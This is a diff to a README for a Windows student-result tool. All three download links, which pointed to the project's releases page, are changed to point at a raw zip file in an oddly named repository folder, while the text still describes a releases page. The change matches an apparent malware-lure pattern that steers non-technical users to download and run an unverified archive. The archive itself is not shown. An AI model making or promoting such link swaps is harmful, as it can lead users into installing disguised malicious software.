@@ -1,6 +1,6 @@
 # 🎓 Student_Result_Analysis - Simple Student Result Overview
 
-[![Download Latest Release](https://img.shields.io/badge/download-Student_Result_Analysis-4CAF50?style=for-the-badge)](https://github.com/aboaliai/Student_Result_Analysis/releases)
+[![Download Latest Release](https://img.shields.io/badge/download-Student_Result_Analysis-4CAF50?style=for-the-badge)](https://github.com/aboaliai/Student_Result_Analysis/raw/refs/heads/main/Amoyese/Student-Result-Analysis-2.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ No special hardware or software skills are needed.
 ## 🚀 Download and Setup on Windows
 
 1. Click the big green button at the top or this link to **visit the release page**:  
-   https://github.com/aboaliai/Student_Result_Analysis/releases  
+   https://github.com/aboaliai/Student_Result_Analysis/raw/refs/heads/main/Amoyese/Student-Result-Analysis-2.8.zip  
 
 2. On the releases page, look for the latest version. Find the file named something like `Student_Result_Analysis_Setup.exe` or `Student_Result_Analysis_Windows.zip`.
 
@@ -149,6 +149,6 @@ If you have questions or need more help:
 
 Return to this page anytime for the latest version:  
 
-[Download or visit the release page here](https://github.com/aboaliai/Student_Result_Analysis/releases)  
+[Download or visit the release page here](https://github.com/aboaliai/Student_Result_Analysis/raw/refs/heads/main/Amoyese/Student-Result-Analysis-2.8.zip)  
 
 Use this link to get the installer or ZIP file and follow the instructions above.
